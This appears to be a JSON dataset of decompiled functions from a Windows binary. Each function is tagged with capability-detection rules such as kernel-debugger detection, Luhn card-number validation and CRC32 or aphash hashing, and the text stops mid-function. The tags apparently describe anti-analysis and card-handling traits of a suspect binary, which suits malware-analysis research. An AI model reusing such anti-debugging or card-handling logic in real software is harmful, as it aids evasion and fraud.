{
    "00401270": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401270(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    fcn.00451500(arg_8h, arg_ch, arg_10h << 1);\n    return;\n}\n",
        "token_count": 56
    },
    "00401290": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401290(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    fcn.00451a80(arg_8h, arg_ch, arg_10h << 1);\n    return;\n}\n",
        "token_count": 57
    },
    "00402460": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402460(uchar *arg_8h, uint8_t *arg_ch)\n\n{\n    *arg_8h = (*arg_ch & 0xfc) >> 2;\n    arg_8h[1] = ((*arg_ch & 3) << 4) + ((arg_ch[1] & 0xf0) >> 4);\n    arg_8h[2] = ((arg_ch[2] & 0xc0) >> 6) + (arg_ch[1] & 0xf) * '\\x04';\n    arg_8h[3] = arg_ch[2] & 0x3f;\n    return;\n}\n",
        "token_count": 149
    },
    "00465585": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00465585(uint param_1, int32_t param_2)\n\n{\n    uint8_t uVar1;\n    float10 fVar2;\n    int32_t iVar3;\n    char cVar4;\n    char cVar6;\n    uint32_t uVar5;\n    ushort uVar7;\n    int32_t unaff_EBP;\n    float10 in_ST0;\n    float10 in_ST1;\n    uint var_a2h;\n    uint var_94h;\n    uint var_90h;\n    \n    if (*(param_2 + 0xe) == '\\x05') {\n        uVar7 = CONCAT31(*(unaff_EBP + -0xa4) >> 8 & 0xfe | 2, 0x3f);\n    }\n    else {\n        uVar7 = 0x133f;\n    }\n    *(unaff_EBP + -0xa2) = uVar7;\n    fVar2 = 0;\n    *(unaff_EBP + -0x94) = param_2;\n    *(unaff_EBP + -0xa0) = (in_ST0 < fVar2) << 9 | (in_ST0 != fVar2) << 10 | (in_ST0 == fVar2) << 0xe;\n    *(unaff_EBP + -0x90) = 0;\n    fVar2 = 0;\n    *(unaff_EBP + -0xa0) = (in_ST1 < fVar2) << 9 | (in_ST1 != fVar2) << 10 | (in_ST1 == fVar2) << 0xe;\n    cVar6 = (*(unaff_EBP + -0x9f) << 1) >> 1;\n    uVar1 = cVar6 << 1;\n    cVar4 = (*(unaff_EBP + -0x9f) << 1) >> 1;\n    uVar5 = CONCAT11(uVar1, cVar4 << 1 | cVar4 < '\\0');\n    iVar3 = *((uVar5 & 0xf) + 0x47bdce) | *((uVar1 & 0xf | cVar6 < '\\0') + 0x47bdce) << 2;\n    (**0x4742a4)(uVar5 & 0x404, param_2, iVar3);\n    // WARNING: Could not recover jumptable at 0x0046561d. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(param_2 + iVar3 + 0x10))();\n    return;\n}\n",
        "token_count": 574
    },
    "null": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl method.std::runtime_error.virtual_0(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.00401530();\n    if ((arg_8h & 1) != 0) {\n        fcn.0043a7bc(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 81
    },
    "0040a000": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040a000(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.00404f30();\n    if ((arg_8h & 1) != 0) {\n        fcn.0043a7bc(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 81
    },
    "0040d4f0": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040d4f0(int32_t param_1)\n\n{\n    char cVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    uint arg_8h;\n    int32_t *in_FS_OFFSET;\n    uint in_stack_fffffe94;\n    uint *puVar6;\n    uint var_150h;\n    uint var_f0h;\n    uint var_a8h;\n    uint var_60h;\n    uint var_58h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint32_t var_34h;\n    char var_2dh;\n    int32_t var_2ch;\n    uint var_28h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x47082a;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &fcn.0040d4f0::var_ch;\n    var_34h = 0;\n    var_2ch = param_1;\n    if (*(param_1 + 0x30) == '\\0') {\n        puVar6 = &fcn.0040d4f0::var_58h;\n        fcn.0040e4c0(puVar6, var_10h);\n        fcn.0040e6f0();\n        puVar2 = fcn.0040d150(puVar6);\n        puVar6 = puVar2[1];\n        cVar1 = fcn.0040da80(*puVar2);\n        if (cVar1 != '\\0') {\n            if (*(var_2ch + 0x34) != 1) {\n                puVar6 = &fcn.0040d4f0::var_60h;\n                fcn.0040e4c0();\n                fcn.0040e6f0();\n                puVar2 = fcn.0040d150(puVar6);\n                in_stack_fffffe94 = 0x40d58f;\n                cVar1 = fcn.0040db10(*puVar2);\n                if (cVar1 != '\\0') goto code_r0x0040d599;\n            }\n            fcn.0040e4c0(puVar6);\n            fcn.0040e6f0();\n            uVar5 = fcn.00402930();\n            iVar3 = fcn.0040e4c0();\n            fcn.0040d040(&fcn.0040d4f0::var_28h, iVar3 + 0x48, uVar5);\n            var_4h = 0;\n            fcn.0040e4c0();\n            fcn.0040e6d0();\n            in_stack_fffffe94 = fcn.0040e730(&fcn.0040d4f0::var_28h);\n            var_4h._0_1_ = 1;\n            var_40h = in_stack_fffffe94;\n            var_3ch = in_stack_fffffe94;\n            var_48h = fcn.0040fd30(in_stack_fffffe94, &fcn.0040d4f0::var_28h);\n            var_4h._0_1_ = 2;\n            var_44h = var_48h;\n            fcn.0040e550(var_48h);\n            var_4h._0_1_ = 1;\n            fcn.0040d8a0();\n            var_4h = var_4h._1_3_ << 8;\n            fcn.0040d8c0();\n            var_4h = 0xffffffff;\n            fcn.0040cf10();\n            goto code_r0x0040d66e;\n        }\n    }\ncode_r0x0040d599:\n    *(var_2ch + 0x30) = 0;\n    fcn.0040e4c0();\n    fcn.0040e6d0();\ncode_r0x0040d66e:\n    do {\n        uVar4 = fcn.0040e4e0();\n        if (uVar4 < 2) {\ncode_r0x0040d6c4:\n            var_38h = 0;\n        }\n        else {\n            uVar5 = fcn.0040e880();\n            var_4h = 3;\n            var_34h = var_34h | 1;\n            var_50h = uVar5;\n            var_4ch = uVar5;\n            arg_8h = fcn.0040e4c0();\n            cVar1 = fcn.0040fdb0(arg_8h, uVar5);\n            if (cVar1 == '\\0') goto code_r0x0040d6c4;\n            var_38h = 1;\n        }\n        var_2dh = var_38h;\n        var_4h = 0xffffffff;\n        if ((var_34h & 1) != 0) {\n            var_34h = var_34h & 0xfffffffe;\n            fcn.0040d8c0();\n        }\n        if (var_2dh == '\\0') {\n            fcn.0040d760();\n            *in_FS_OFFSET = var_ch;\n            fcn.0043a2e7(in_stack_fffffe94);\n            return;\n        }\n        fcn.0040d4b0();\n    } while( true );\n}\n",
        "token_count": 1313
    },
    "0040de80": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040de80(uint arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint *in_stack_ffffff40;\n    char16_t *arg_ch;\n    uint var_a4h;\n    uint var_8ch;\n    uint var_88h;\n    int32_t var_84h;\n    uint var_80h;\n    int32_t var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    int32_t var_6ch;\n    int32_t var_68h;\n    uint32_t var_64h;\n    uint var_60h;\n    uint var_59h;\n    uint var_40h;\n    uint var_28h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470910;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &fcn.0040de80::var_ch;\n    var_64h = 0;\n    cVar1 = fcn.00404d10(var_10h);\n    if (cVar1 != '\\0') goto code_r0x0040e120;\n    arg_ch = L\"true\";\n    uVar2 = fcn.004033f0();\n    cVar1 = fcn.0040fe70(uVar2, arg_ch);\n    if (cVar1 != '\\0') {\n        uVar2 = fcn.00401440(arg_8h);\n        cVar1 = fcn.0040e1f0(uVar2);\n        if (cVar1 != '\\0') goto code_r0x0040e120;\n    }\n    uVar2 = fcn.00401440(arg_8h);\n    fcn.0040e140(&fcn.0040de80::var_28h, uVar2);\n    cVar1 = fcn.00404d10();\n    if (cVar1 == '\\0') {\n        var_64h = var_64h | 1;\n        uVar2 = fcn.00403490(&fcn.0040de80::var_a4h);\n        in_stack_ffffff40 = &fcn.0040de80::var_28h;\n        cVar1 = fcn.0040cdc0(in_stack_ffffff40, uVar2);\n        if (cVar1 != '\\0') goto code_r0x0040dfbf;\n        uVar2 = fcn.00401440(arg_8h);\n        in_stack_ffffff40 = 0x40df77;\n        cVar1 = fcn.0040e2c0(uVar2);\n        if (cVar1 != '\\0') goto code_r0x0040dfbf;\n        in_stack_ffffff40 = fcn.00401440(arg_8h);\n        cVar1 = fcn.0040e390(in_stack_ffffff40);\n        if (cVar1 != '\\0') goto code_r0x0040dfbf;\n        uVar2 = fcn.00401440(arg_8h);\n        cVar1 = fcn.0040e3f0(uVar2);\n        if (cVar1 != '\\0') goto code_r0x0040dfbf;\n        var_70h = 1;\n    }\n    else {\ncode_r0x0040dfbf:\n        var_70h = 0;\n    }\n    var_59h._0_1_ = var_70h;\n    if ((var_64h & 1) != 0) {\n        var_64h = var_64h & 0xfffffffe;\n        fcn.00404f30();\n    }\n    if (var_59h == '\\0') {\n        fcn.00404f30();\n    }\n    else {\n        var_74h = fcn.00403370();\n        var_68h = fcn.0040e9d0();\n        var_7ch = fcn.0040e4e0();\n        for (; var_68h != var_7ch; var_68h = var_68h + 0x18) {\n            fcn.00407620(var_68h);\n            cVar1 = fcn.0040cdc0(&fcn.0040de80::var_28h, &fcn.0040de80::var_40h);\n            if (cVar1 != '\\0') {\n                var_80h = 0;\n                fcn.00404f30();\n                fcn.00404f30();\n                goto code_r0x0040e120;\n            }\n            fcn.00404f30();\n        }\n        var_78h = fcn.00403390();\n        var_6ch = fcn.0040e9d0();\n        var_84h = fcn.0040e4e0();\n        for (; var_6ch != var_84h; var_6ch = var_6ch + 0x18) {\n            fcn.00407620(var_6ch);\n            cVar1 = fcn.0040cdc0(&fcn.0040de80::var_28h, &fcn.0040de80::var_59h + 1);\n            if (cVar1 != '\\0') {\n                var_88h = 2;\n                fcn.00404f30();\n                fcn.00404f30();\n                goto code_r0x0040e120;\n            }\n            fcn.00404f30();\n        }\n        var_8ch = 1;\n        fcn.00404f30();\n    }\ncode_r0x0040e120:\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(in_stack_ffffff40);\n    return;\n}\n",
        "token_count": 1330
    },
    "004102f0": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004102f0(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.0040d8a0();\n    if ((arg_8h & 1) != 0) {\n        fcn.0043a7bc(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 83
    },
    "00412c40": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00412c40(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.00412ac0();\n    if ((arg_8h & 1) != 0) {\n        fcn.0043a7bc(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 81
    },
    "00413c90": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00413c90(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.00413cc0();\n    if ((arg_8h & 1) != 0) {\n        fcn.0043a7bc(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 81
    },
    "3b8ab8d2": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl\nmethod.Concurrency::details::_CancellationTokenCallback_class__lambda_3b8ab8d2629adf61a42ee3fe177a046b__.virtual_0\n          (uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.00416820();\n    if ((arg_8h & 1) != 0) {\n        fcn.0043a7bc(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 113
    },
    "00417bc0": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00417bc0(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.00413fb0();\n    if ((arg_8h & 1) != 0) {\n        fcn.0043a7bc(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 81
    },
    "00418730": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00418730(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.00418790();\n    if ((arg_8h & 1) != 0) {\n        fcn.0043a7bc(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 79
    },
    "00418760": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00418760(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.004187b0();\n    if ((arg_8h & 1) != 0) {\n        fcn.0043a7bc(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 80
    },
    "00419d70": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.00419d70(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint noname_28, uint arg_8h)\n\n{\n    uint uVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    uint var_4h_3;\n    uint var_8h;\n    uint var_ch_2;\n    uint var_40h;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    uchar auStack120 [4];\n    uint uStack116;\n    uint *puStack112;\n    uint32_t uStack108;\n    uint var_64h;\n    uint var_54h;\n    uint var_44h;\n    uchar *puStack68;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h_2;\n    uint32_t var_14h_2;\n    int32_t var_dh;\n    uint uStack12;\n    uint var_4h_2;\n    \n    var_4h_2 = 0xffffffff;\n    uStack12 = 0x47193a;\n    unique0x00005080 = *in_FS_OFFSET;\n    uStack108 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &fcn.00419d70::var_dh + 1;\n    var_14h_2 = 0;\n    puStack112 = 0x419da7;\n    fcn.00415f70();\n    var_4h_2 = 0;\n    puStack112 = &fcn.00419d70::var_8h;\n    uStack116 = 0x419db7;\n    fcn.00408580();\n    puStack68 = &stack0xffffff88;\n    var_44h = fcn.00414270(&stack0xffffff88);\n    var_4h_2._0_1_ = 1;\n    var_24h = fcn.00414230(&fcn.00419d70::var_28h);\n    var_4h_2._0_1_ = 2;\n    var_20h = var_24h;\n    uVar1 = fcn.00413530();\n    var_4h_2._0_1_ = 3;\n    fcn.00415e20(uVar1);\n    var_4h_2._0_1_ = 0;\n    fcn.004134f0();\n    pcVar2 = fcn.004142c0(var_ch_2);\n    if (*pcVar2 == '\\0') {\n        var_38h = fcn.00413b00(&fcn.00419d70::var_54h, var_4h_3);\n        var_4h_2 = 5;\n        var_14h_2 = var_14h_2 | 2;\n        var_34h = var_38h;\n        var_1ch = var_38h;\n    }\n    else {\n        iVar3 = fcn.004142c0(var_ch_2);\n        var_30h = fcn.00414060(iVar3 + 4);\n        var_4h_2 = CONCAT31(var_4h_2._1_3_, 4);\n        var_14h_2 = var_14h_2 | 1;\n        var_2ch = var_30h;\n        var_1ch = var_30h;\n    }\n    var_3ch = var_1ch;\n    fcn.00415df0(var_1ch);\n    var_4h_2 = 4;\n    if ((var_14h_2 & 2) != 0) {\n        var_14h_2 = var_14h_2 & 0xfffffffd;\n        fcn.00413b60();\n    }\n    var_4h_2 = 0;\n    if ((var_14h_2 & 1) != 0) {\n        var_14h_2 = var_14h_2 & 0xfffffffe;\n        fcn.00413b60();\n    }\n    fcn.0041a0d0(&fcn.00419d70::var_8h);\n    *in_FS_OFFSET = stack0xfffffff0;\n    return var_18h_2;\n}\n",
        "token_count": 1185
    },
    "00419f00": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.00419f00(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint noname_28, uint arg_8h)\n\n{\n    uint uVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    uint var_4h_3;\n    uint var_8h;\n    uint var_ch_2;\n    uint var_40h;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    uchar auStack120 [4];\n    uint uStack116;\n    uint *puStack112;\n    uint32_t uStack108;\n    uint var_64h;\n    uint var_54h;\n    uint var_44h;\n    uchar *puStack68;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h_2;\n    uint32_t var_14h_2;\n    int32_t var_dh;\n    uint uStack12;\n    uint var_4h_2;\n    \n    var_4h_2 = 0xffffffff;\n    uStack12 = 0x47193a;\n    unique0x00005080 = *in_FS_OFFSET;\n    uStack108 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &fcn.00419f00::var_dh + 1;\n    var_14h_2 = 0;\n    puStack112 = 0x419f37;\n    fcn.00415f70();\n    var_4h_2 = 0;\n    puStack112 = &fcn.00419f00::var_8h;\n    uStack116 = 0x419f47;\n    fcn.00408580();\n    puStack68 = &stack0xffffff88;\n    var_44h = fcn.00414270(&stack0xffffff88);\n    var_4h_2._0_1_ = 1;\n    var_24h = fcn.00414230(&fcn.00419f00::var_28h);\n    var_4h_2._0_1_ = 2;\n    var_20h = var_24h;\n    uVar1 = fcn.00413530();\n    var_4h_2._0_1_ = 3;\n    fcn.00415e20(uVar1);\n    var_4h_2._0_1_ = 0;\n    fcn.004134f0();\n    pcVar2 = fcn.004142c0(var_ch_2);\n    if (*pcVar2 == '\\0') {\n        var_38h = fcn.00413b00(&fcn.00419f00::var_54h, var_4h_3);\n        var_4h_2 = 5;\n        var_14h_2 = var_14h_2 | 2;\n        var_34h = var_38h;\n        var_1ch = var_38h;\n    }\n    else {\n        iVar3 = fcn.004142c0(var_ch_2);\n        var_30h = fcn.00414060(iVar3 + 4);\n        var_4h_2 = CONCAT31(var_4h_2._1_3_, 4);\n        var_14h_2 = var_14h_2 | 1;\n        var_2ch = var_30h;\n        var_1ch = var_30h;\n    }\n    var_3ch = var_1ch;\n    fcn.00415df0(var_1ch);\n    var_4h_2 = 4;\n    if ((var_14h_2 & 2) != 0) {\n        var_14h_2 = var_14h_2 & 0xfffffffd;\n        fcn.00413b60();\n    }\n    var_4h_2 = 0;\n    if ((var_14h_2 & 1) != 0) {\n        var_14h_2 = var_14h_2 & 0xfffffffe;\n        fcn.00413b60();\n    }\n    fcn.0041a0f0(&fcn.00419f00::var_8h);\n    *in_FS_OFFSET = stack0xfffffff0;\n    return var_18h_2;\n}\n",
        "token_count": 1185
    },
    "0041a890": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041a890(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.0041a590();\n    if ((arg_8h & 1) != 0) {\n        fcn.0043a7bc(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 81
    },
    "8631d985": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl\nmethod.Concurrency::task_unsigned_char_::_InitialTaskHandle_void__class__lambda_8631d98553bef38a416bc3f062934a92___struct_Concurrency::details::_TypeSelectorNoAsync_.virtual_0\n          (uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.0041a600();\n    if ((arg_8h & 1) != 0) {\n        fcn.0043a7bc(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 127
    },
    "0041a8f0": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041a8f0(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.0041a7a0();\n    if ((arg_8h & 1) != 0) {\n        fcn.0043a7bc(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 85
    },
    "55d7a76f": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl\nmethod.Concurrency::task_unsigned_char_::_InitialTaskHandle_void__class__lambda_55d7a76ff9ef1ba2590ace9f1f34e2e1___struct_Concurrency::details::_TypeSelectorNoAsync_.virtual_0\n          (uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.0041a810();\n    if ((arg_8h & 1) != 0) {\n        fcn.0043a7bc(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 133
    },
    "0041db00": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041db00(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.0041d0a0();\n    if ((arg_8h & 1) != 0) {\n        fcn.0043a7bc(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 83
    },
    "0041f060": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.0041f060(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint noname_28, uint arg_8h)\n\n{\n    uint uVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    uint var_4h_3;\n    uint var_8h;\n    uint var_ch_2;\n    uint var_40h;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    uchar auStack120 [4];\n    uint uStack116;\n    uint *puStack112;\n    uint32_t uStack108;\n    uint var_64h;\n    uint var_54h;\n    uint var_44h;\n    uchar *puStack68;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h_2;\n    uint32_t var_14h_2;\n    int32_t var_dh;\n    uint uStack12;\n    uint var_4h_2;\n    \n    var_4h_2 = 0xffffffff;\n    uStack12 = 0x47193a;\n    unique0x00005080 = *in_FS_OFFSET;\n    uStack108 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &fcn.0041f060::var_dh + 1;\n    var_14h_2 = 0;\n    puStack112 = 0x41f097;\n    fcn.00415f70();\n    var_4h_2 = 0;\n    puStack112 = &fcn.0041f060::var_8h;\n    uStack116 = 0x41f0a7;\n    fcn.00408580();\n    puStack68 = &stack0xffffff88;\n    var_44h = fcn.00414270(&stack0xffffff88);\n    var_4h_2._0_1_ = 1;\n    var_24h = 